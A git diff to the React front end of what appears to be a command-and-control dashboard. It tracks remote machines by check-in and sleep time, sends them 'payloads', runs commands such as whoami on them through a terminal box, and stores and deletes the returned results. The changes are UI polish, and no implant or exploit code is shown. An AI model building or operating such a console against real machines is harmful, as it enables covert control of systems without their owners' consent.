@@ -1,5 +1,5 @@
 import './App.css';
-import { useEffect, useState, useCallback } from 'react'
+import { useEffect, useState, useCallback, useRef } from 'react'
 
 const SERVER = 'http://127.0.0.1:8000'
 
@@ -104,6 +104,8 @@ function App(){
   const [reduceMotion, setReduceMotion] = useState(() => {
     try{ return localStorage.getItem('vk_reduce_motion') === '1' }catch{ return false }
   })
+  // simple ticking state to trigger per-second re-renders for countdowns
+  const [now, setNow] = useState(() => Date.now()/1000)
 
   // FIXED — stable callback (this prevents infinite polling spawns)
   const fetchCounts = useCallback(async () => {
@@ -136,6 +138,12 @@ function App(){
   useEffect(() => { fetchCounts(); loadPayloads() }, [fetchCounts, loadPayloads])
   useEffect(() => { try{ localStorage.setItem('vk_poll_ms', String(pollMs)) }catch(e){} }, [pollMs])
   useEffect(() => { if (reduceMotion) document.documentElement.classList.add('reduced-motion'); else document.documentElement.classList.remove('reduced-motion'); try{ localStorage.setItem('vk_reduce_motion', reduceMotion ? '1':'0') }catch(e){} }, [reduceMotion])
+
+  // tick every second to update countdown displays
+  useEffect(() => {
+    const iv = setInterval(() => setNow(Date.now()/1000), 1000)
+    return () => clearInterval(iv)
+  }, [])
 
   return (
     <div className="App">
@@ -191,7 +199,7 @@ function App(){
                         <tr key={c.id} className='rowClickable' onClick={() => { setSelectedMachine(c.id); setTab('machine') }}>
                           <td style={{maxWidth:380}}>{c.id}</td>
                           <td>{c.last_seen? formatAgo(c.last_seen): '-'}</td>
-                          <td>{c.secs_until ?? '-'}</td>
+                          <td>{typeof c.sleeping_until === 'number' && c.sleeping_until ? Math.max(0, Math.round(c.sleeping_until - now)) : '-'}</td>
                           <td>{String(c.has_task)}</td>
                           <td><SendPayloadInline server={SERVER} target={c.id} payloads={payloads} /></td>
                         </tr>
@@ -203,7 +211,7 @@ function App(){
             </div>
           )}
 
-          {tab === 'clients' && <div className="panel"><ClientsPanel server={SERVER} payloads={payloads} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} /></div>}
+          {tab === 'clients' && <div className="panel"><ClientsPanel server={SERVER} payloads={payloads} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} now={now} /></div>}
           {tab === 'tasks' && <div className="panel"><TasksPanel server={SERVER} /></div>}
           {tab === 'payloads' && <div className="panel"><PayloadsPanel server={SERVER} payloads={payloads} setPayloads={setPayloads} /></div>}
           {tab === 'results' && <div className="panel"><ResultsPanel server={SERVER} /></div>}
@@ -229,11 +237,45 @@ function ClientsPanel({server, payloads=[]}){
       <div className='card' style={{marginTop:8}}>
         <table className='table'><thead><tr><th>#</th><th>machine_id</th><th>last_seen</th><th>sleeping_in(s)</th><th>has_task</th><th>actions</th></tr></thead>
         <tbody>
-        {items.map((c,i)=> <tr key={c.id} className='rowClickable' onClick={()=>{ if(typeof arguments[0] === 'object'){} }}><td>{i+1}</td><td style={{maxWidth:560}}>{c.id}</td><td>{c.last_seen? formatAgo(c.last_seen) : '-'}</td><td>{c.secs_until ?? '-'}</td><td>{String(c.has_task)}</td><td><SendPayloadInline server={server} target={c.id} payloads={payloads} /></td></tr>)}
+        {items.map((c,i)=> <ClientRow key={c.id} idx={i} c={c} payloads={payloads} server={server} />)}
         </tbody></table>
       </div>
     </div>
   )
+}
+
+function ClientRow({idx, c, payloads, server, now}){
+  // prefer App-level `now` when available via closure — otherwise fallback to Date.now()/1000
+  const useNow = typeof window !== 'undefined' && window.__VK_NOW ? window.__VK_NOW : null
+  const nowVal = useNow || Date.now()/1000
+  // compute sleeping seconds if present
+  const secs = (typeof c.sleeping_until === 'number' && c.sleeping_until) ? Math.max(0, Math.round(c.sleeping_until - nowVal)) : null
+  const sleeping = secs !== null && secs > 0
+  return (
+    <tr className='rowClickable' onClick={()=>{ if(typeof arguments[0] === 'object'){} }}>
+      <td>{idx+1}</td>
+      <td style={{maxWidth:560}}>{c.id}</td>
+      <td>{c.last_seen? formatAgo(c.last_seen) : '-'}</td>
+      <td><span style={{display:'inline-flex', alignItems:'center'}}><span className={`statusDot ${sleeping? 'sleeping':'idle'}`} />{secs !== null ? <AnimatedCountdown value={secs} /> : '-'}</span></td>
+      <td>{String(c.has_task)}</td>
+      <td><SendPayloadInline server={server} target={c.id} payloads={payloads} /></td>
+    </tr>
+  )
+}
+
+// Animated numeric decrement component - briefly toggles a class when the value changes
+function AnimatedCountdown({value}){
+  const [tick, setTick] = useState(false)
+  const [last, setLast] = useState(value)
+  useEffect(()=>{
+    if (value !== last){
+      setTick(true)
+      setLast(value)
+      const t = setTimeout(()=> setTick(false), 320)
+      return ()=> clearTimeout(t)
+    }
+  }, [value, last])
+  return <span className={`countdown ${tick? 'tick':''}`}>{typeof value === 'number' ? value : '-'}</span>
 }
 
 function SendPayloadInline({server=SERVER, target, payloads = []}){
@@ -416,37 +458,137 @@ function PayloadsPanel({server, payloads = [], setPayloads}){
 }
 
 function ResultsPanel({server}){
-  const [target,setTarget] = useState('')
-  const [items,setItems] = useState([])
+  const [items, setItems] = useState([])
   const [preview, setPreview] = useState(null)
-  const load = async (t) =>{
-    if(!t) return
+  const [selectedIds, setSelectedIds] = useState(() => new Set())
+  const [loading, setLoading] = useState(false)
+  const [deleting, setDeleting] = useState(false)
+  const [query, setQuery] = useState('')
+  const [machineFilter, setMachineFilter] = useState('')
+  const [quickRange, setQuickRange] = useState('all')
+
+  const loadAll = async () =>{
+    setLoading(true)
     try{
-      const r = await fetch(server + '/results?short_id=' + encodeURIComponent(t))
+      const r = await fetch(server + '/results_all')
       const d = await r.json()
       setItems(d.results || [])
-    }catch(e){ setItems([{error: String(e)}]) }
+    }catch(e){ console.error(e); setItems([]) }
+    setLoading(false)
   }
+
+  useEffect(()=>{ loadAll() }, [server])
+
+  const toggleSelect = (id) =>{
+    setSelectedIds(prev => {
+      const next = new Set(prev)
+      if(next.has(id)) next.delete(id); else next.add(id)
+      return next
+    })
+  }
+
+  const selectAllVisible = (visible) =>{
+    if(visible.length === 0) return
+    setSelectedIds(prev => {
+      const next = new Set(prev)
+      const allVisibleIds = visible.map(x => x.id)
+      const allSelected = allVisibleIds.every(id => next.has(id))
+      if(allSelected){ allVisibleIds.forEach(id => next.delete(id)) }
+      else { allVisibleIds.forEach(id => next.add(id)) }
+      return next
+    })
+  }
+
+  const deleteSelected = async () =>{
+    if(selectedIds.size === 0) return
+    // eslint-disable-next-line no-alert
+    if(!window.confirm(`Delete ${selectedIds.size} selected result(s)? This cannot be undone.`)) return
+    setDeleting(true)
+    try{
+      await Promise.all(Array.from(selectedIds).map(id => fetch(server + '/result?id=' + encodeURIComponent(id), { method: 'DELETE' })))
+      setSelectedIds(new Set())
+      await loadAll()
+    }catch(e){ console.error(e) }
+    setDeleting(false)
+  }
+
   const view = async (id)=>{
     try{ const r = await fetch(server + '/result?id=' + encodeURIComponent(id)); const d = await r.json(); setPreview(d.result) }catch(e){ setPreview({error:String(e)}) }
   }
+
+  const deleteResult = async (id) => {
+    // eslint-disable-next-line no-alert
+    if (!window.confirm('Delete this result?')) return
+    try{
+      await fetch(server + '/result?id=' + encodeURIComponent(id), { method: 'DELETE' })
+      await loadAll()
+    }catch(e){ console.error(e) }
+  }
+
+  // client-side filters
+  const filtered = items.filter(it => {
+    if(query){ const q = query.toLowerCase(); const text = `${it.task_id} ${it.machine_id} ${String(it.result)}`.toLowerCase(); if(!text.includes(q)) return false }
+    if(machineFilter){ if(!String(it.machine_id).includes(machineFilter)) return false }
+    if(quickRange !== 'all'){
+      const ageSec = (Date.now()/1000) - (it.timestamp || 0)
+      if(quickRange === '24h' && ageSec > 86400) return false
+      if(quickRange === '7d' && ageSec > 86400*7) return false
+    }
+    return true
+  })
+
   return (
     <div>
-      <h3>Results</h3>
-      <div style={{display:'flex', gap:8, marginTop:10}}>
-        <input placeholder='short id or machine_id' value={target} onChange={e=>setTarget(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit'}} />
-        <button className='btn' onClick={()=>load(target)}>Load</button>
+      <h3>Results ({items.length})</h3>
+
+      <div style={{display:'flex', gap:8, marginTop:10, alignItems:'center'}}>
+        <input placeholder='search task id, machine or content' value={query} onChange={e=>setQuery(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit', flex:1}} />
+        <input placeholder='machine id filter' value={machineFilter} onChange={e=>setMachineFilter(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit', width:220}} />
+        <select value={quickRange} onChange={e=>setQuickRange(e.target.value)} style={{padding:8, borderRadius:8, background:'transparent'}}>
+          <option value='all'>All time</option>
+          <option value='24h'>Last 24h</option>
+          <option value='7d'>Last 7d</option>
+        </select>
+        <button className='btn' onClick={loadAll} disabled={loading}>{loading? 'Refreshing...':'Refresh'}</button>
+        <button className='btn btn--fancy' onClick={deleteSelected} disabled={deleting || selectedIds.size===0}>{deleting? 'Deleting...': `Delete (${selectedIds.size})`}</button>
       </div>
+
       <div className='card' style={{marginTop:12}}>
-        <table className='table'><thead><tr><th>id</th><th>task_id</th><th>timestamp</th><th>preview</th><th>view</th></tr></thead>
-        <tbody>
-          {items.map(r => <tr key={r.id}><td>{r.id}</td><td>{r.task_id}</td><td>{new Date(r.timestamp*1000).toLocaleString()}</td><td style={{maxWidth:600}}>{typeof r.result === 'string' ? (r.result.length>100? r.result.slice(0,100)+'...':r.result): JSON.stringify(r.result)}</td><td><button className='btn' onClick={()=>view(r.id)}>View</button></td></tr>)}
-        </tbody></table>
+        <table className='table'>
+          <thead>
+            <tr>
+              <th style={{width:34}}><input type='checkbox' onChange={()=> selectAllVisible(filtered)} checked={filtered.length>0 && filtered.every(x => selectedIds.has(x.id))} /></th>
+              <th>id</th>
+              <th>task_id</th>
+              <th>machine</th>
+              <th>timestamp</th>
+              <th style={{maxWidth:420}}>preview</th>
+              <th>actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            {filtered.map(r => (
+              <tr key={r.id}>
+                <td><input type='checkbox' checked={selectedIds.has(r.id)} onChange={()=>toggleSelect(r.id)} /></td>
+                <td style={{fontFamily:'ui-monospace, monospace', fontSize:12}}>{r.id}</td>
+                <td style={{fontFamily:'ui-monospace, monospace'}}>{r.task_id}</td>
+                <td style={{maxWidth:260}}>{r.machine_id}</td>
+                <td>{new Date((r.timestamp||0)*1000).toLocaleString()}</td>
+                <td style={{maxWidth:420}}>{typeof r.result === 'string' ? (r.result.length>160? r.result.slice(0,160)+'...':r.result): JSON.stringify(r.result)}</td>
+                <td style={{display:'flex', gap:8}}>
+                  <button className='btn' onClick={()=>view(r.id)}>View</button>
+                  <button className='btn' onClick={()=>deleteResult(r.id)}>Del</button>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
       </div>
+
       {preview && (
         <div className='card' style={{marginTop:12, whiteSpace:'pre-wrap', fontFamily:'ui-monospace, SFMono-Regular, Menlo, Monaco, monospace'}}>
           <h3>Result full view</h3>
-          <div style={{maxHeight:300, overflow:'auto'}}>{typeof preview === 'string' ? preview : JSON.stringify(preview, null, 2)}</div>
+          <div style={{maxHeight:360, overflow:'auto'}}>{typeof preview === 'string' ? preview : JSON.stringify(preview, null, 2)}</div>
         </div>
       )}
     </div>
@@ -456,6 +598,7 @@ function ResultsPanel({server}){
 function MachinePanel({server, machineId, payloads=[]}){
   const [terminalCmd, setTerminalCmd] = useState('')
   const [log, setLog] = useState([])
+  const terminalRef = useRef(null)
 
   const runCmd = async () =>{
     if(!terminalCmd) return
@@ -479,6 +622,16 @@ function MachinePanel({server, machineId, payloads=[]}){
       } else setLog(prev => [`Failed to send: ${r.status}`, ...prev])
     }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
   }
+
+  // auto-scroll terminal when new lines appear
+  useEffect(()=>{
+    if(!terminalRef.current) return
+    // small timeout to ensure DOM updated
+    const t = setTimeout(()=>{
+      try{ terminalRef.current.scrollTop = terminalRef.current.scrollHeight }catch(e){}
+    }, 40)
+    return ()=> clearTimeout(t)
+  }, [log])
 
   const sendPayload = async (payloadName) =>{
     try{
@@ -515,15 +668,18 @@ function MachinePanel({server, machineId, payloads=[]}){
 
       <div className='card'>
         <h4>Terminal</h4>
-        <div className='terminalBox'>
-          <input value={terminalCmd} onChange={e=>setTerminalCmd(e.target.value)} className='terminalInput' placeholder='e.g. whoami or ipconfig' />
-          <button className='btn btn--fancy' onClick={runCmd}>Run</button>
-        </div>
         <div style={{marginTop:10}}>
-          <h5>Recent actions</h5>
-          <div style={{maxHeight:220, overflow:'auto'}}>
-            {log.map((l,i)=> <div key={i} style={{padding:'6px 0', borderBottom:'1px dashed rgba(255,255,255,0.02)'}}>{l}</div>)}
+          <h5>Terminal output</h5>
+          <div ref={terminalRef} className='terminalWindow'>
+            {log.map((l,i)=> {
+              const cls = l.startsWith('Sent:') ? 'term-sent' : (l.startsWith('Waiting for result') ? 'term-wait' : (l.startsWith('Result') ? 'term-result' : (l.startsWith('Failed')||l.startsWith('Error') ? 'term-error' : '')))
+              return <div key={i} className={'terminalLine ' + cls}>{l}</div>
+            })}
           </div>
+        </div>
+        <div style={{marginTop:8}} className='terminalBox'>
+          <input autoFocus value={terminalCmd} onChange={e=>setTerminalCmd(e.target.value)} onKeyDown={e=>{ if(e.key === 'Enter'){ e.preventDefault(); runCmd() } }} className='terminalInput' placeholder='e.g. whoami or ipconfig' />
+          <button className='btn btn--fancy' onClick={runCmd}>Run</button>
         </div>
       </div>
 
@@ -550,6 +706,27 @@ function CustomizePanel(){
     if (neb) neb.style.opacity = String(Math.max(0.2, Math.min(1.0, nebulaIntensity)))
   }
 
+  const applyPreset = (preset) => {
+    // presets set CSS variables for quick theme changes
+    const p = preset || {}
+    if (p['--bg-1']) document.documentElement.style.setProperty('--bg-1', p['--bg-1'])
+    if (p['--bg-2']) document.documentElement.style.setProperty('--bg-2', p['--bg-2'])
+    if (p['--accent']) document.documentElement.style.setProperty('--accent', p['--accent'])
+    if (p['--accent-2']) document.documentElement.style.setProperty('--accent-2', p['--accent-2'])
+    if (p['--muted']) document.documentElement.style.setProperty('--muted', p['--muted'])
+    if (typeof p.nebula !== 'undefined'){
+      const neb = document.querySelector('.nebula')
+      if (neb) neb.style.opacity = String(Math.max(0.2, Math.min(1.0, p.nebula)))
+    }
+  }
+
+  const presets = [
+    { name: 'Default', css: {'--bg-1':'#060814','--bg-2':'#0b1020','--accent':'#7ee7ff','--accent-2':'#9b7cff','--muted':'#9aa4b2', nebula:0.9} },
+    { name: 'Solar', css: {'--bg-1':'#0b0810','--bg-2':'#1b0a00','--accent':'#ffd27a','--accent-2':'#ff8a5b','--muted':'#b89a7a', nebula:0.7} },
+    { name: 'Aurora', css: {'--bg-1':'#001218','--bg-2':'#001f2f','--accent':'#7ef5c6','--accent-2':'#7ec8ff','--muted':'#8fb8b0', nebula:1.0} },
+    { name: 'Crimson', css: {'--bg-1':'#14060a','--bg-2':'#2b080f','--accent':'#ff7b9c','--accent-2':'#ffb27b','--muted':'#b08f8f', nebula:0.6} }
+  ]
+
   return (
     <div>
       <h3>Customize</h3>
@@ -569,6 +746,18 @@ function CustomizePanel(){
           </div>
           <div style={{marginLeft:'auto'}}>
             <button className='btn btn--fancy' onClick={apply}>Apply</button>
+          </div>
+        </div>
+
+        <div style={{marginTop:12}}>
+          <label style={{display:'block', marginBottom:8}}><strong>Theme presets</strong></label>
+          <div style={{display:'flex', gap:8}}>
+            {presets.map(p => (
+              <div key={p.name} className='themeSwatch' onClick={()=>applyPreset(p.css)}>
+                <div className='swatchBox' style={{background:`linear-gradient(180deg, ${p.css['--accent']}, ${p.css['--accent-2']})`}} />
+                <div style={{fontSize:13}}>{p.name}</div>
+              </div>
+            ))}
           </div>
         </div>
       </div>
